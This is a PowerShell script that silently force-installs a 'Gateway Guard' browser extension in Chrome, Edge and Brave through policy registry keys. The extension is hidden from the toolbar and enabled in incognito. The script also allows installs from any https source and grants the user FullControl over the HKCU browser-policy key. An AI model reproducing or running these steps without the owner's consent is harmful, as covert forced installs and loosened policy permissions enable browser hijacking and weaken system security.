# Enterprise Browser Extension Registration for Gateway Guard (YP-Raksha)
# Installs silent enterprise force-install policies for Chrome, Edge, and Brave

$ErrorActionPreference = "Continue"

$pacPort = if ($env:PAC_HTTP_PORT) { $env:PAC_HTTP_PORT } else { "18195" }
$envCandidates = @(
    Join-Path $PSScriptRoot "..\..\..\.env",
    Join-Path $PSScriptRoot "..\..\.env",
    Join-Path (Get-Location) ".env"
)
foreach ($c in $envCandidates) {
    if (Test-Path $c) {
        Get-Content $c | ForEach-Object {
            if ($_ -match '^\s*PAC_HTTP_PORT\s*=\s*(.+)$') {
                $pacPort = $matches[1].Trim()
            }
        }
        break
    }
}

$extId = "mipfhcmlcjfhmgldkokdckhndkebkllj"
$updateUrl = "http://127.0.0.1:$pacPort/extension/update.xml"
$forceValue = "$extId;$updateUrl"
$crxPath = "$env:LOCALAPPDATA\Gateway\Guard\guard_extension.crx"

$settingsObj = @{
    $extId = @{
        "installation_mode" = "force_installed"
        "update_url" = $updateUrl
        "incognito" = "spanning"
        "toolbar_pin" = "force_unpinned"
    }
}
$settingsJson = $settingsObj | ConvertTo-Json -Compress

$hives = @("HKLM:\SOFTWARE\Policies", "HKCU:\SOFTWARE\Policies")
$browserPaths = @(
    "Google\Chrome",
    "Microsoft\Edge",
    "BraveSoftware\Brave"
)

foreach ($hive in $hives) {
    foreach ($bp in $browserPaths) {
        $keyPath = "$hive\$bp"
        try {
            if (!(Test-Path $keyPath)) {
                New-Item -Path $keyPath -Force | Out-Null
            }
            Set-ItemProperty -Path $keyPath -Name "ExtensionSettings" -Value $settingsJson -Type String -Force -ErrorAction SilentlyContinue

            $forceKey = "$keyPath\ExtensionInstallForcelist"
            if (!(Test-Path $forceKey)) {
                New-Item -Path $forceKey -Force | Out-Null
            }
            Set-ItemProperty -Path $forceKey -Name "1" -Value $forceValue -Type String -Force -ErrorAction SilentlyContinue

            $srcKey = "$keyPath\ExtensionInstallSources"
            if (!(Test-Path $srcKey)) {
                New-Item -Path $srcKey -Force | Out-Null
            }
            Set-ItemProperty -Path $srcKey -Name "1" -Value "http://127.0.0.1:$pacPort/*" -Type String -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $srcKey -Name "2" -Value "http://localhost:$pacPort/*" -Type String -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $srcKey -Name "3" -Value "https://*/*" -Type String -Force -ErrorAction SilentlyContinue
            Write-Host "[OK] Wrote policies to $keyPath"
        } catch {
            Write-Host "[WARN] Failed writing to $keyPath : $_"
        }
    }
}

# External Extensions registration (HKCU and HKLM)
$extHives = @(
    "HKCU:\SOFTWARE\Google\Chrome\Extensions\$extId",
    "HKCU:\SOFTWARE\Microsoft\Edge\Extensions\$extId",
    "HKCU:\SOFTWARE\BraveSoftware\Brave\Extensions\$extId",
    "HKLM:\SOFTWARE\Google\Chrome\Extensions\$extId",
    "HKLM:\SOFTWARE\Microsoft\Edge\Extensions\$extId",
    "HKLM:\SOFTWARE\BraveSoftware\Brave\Extensions\$extId"
)

foreach ($ep in $extHives) {
    try {
        if (!(Test-Path $ep)) {
            New-Item -Path $ep -Force | Out-Null
        }
        Set-ItemProperty -Path $ep -Name "path" -Value $crxPath -Type String -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $ep -Name "version" -Value "1.0.0" -Type String -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $ep -Name "update_url" -Value $updateUrl -Type String -Force -ErrorAction SilentlyContinue
        Write-Host "[OK] Wrote external extension key: $ep"
    } catch {
        Write-Host "[WARN] Could not write $ep : $_"
    }
}

# Grant Current User FullControl on HKCU:\Software\Policies so agent can write without elevation
try {
    $policiesKey = "HKCU:\Software\Policies"
    $acl = Get-Acl -Path $policiesKey
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($currentUser, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $policiesKey -AclObject $acl
    Write-Host "[OK] Granted FullControl on HKCU:\Software\Policies to $currentUser"
} catch {
    Write-Host "[NOTE] ACL update on HKCU policies: $_"
}

Write-Host "Extension registration complete."
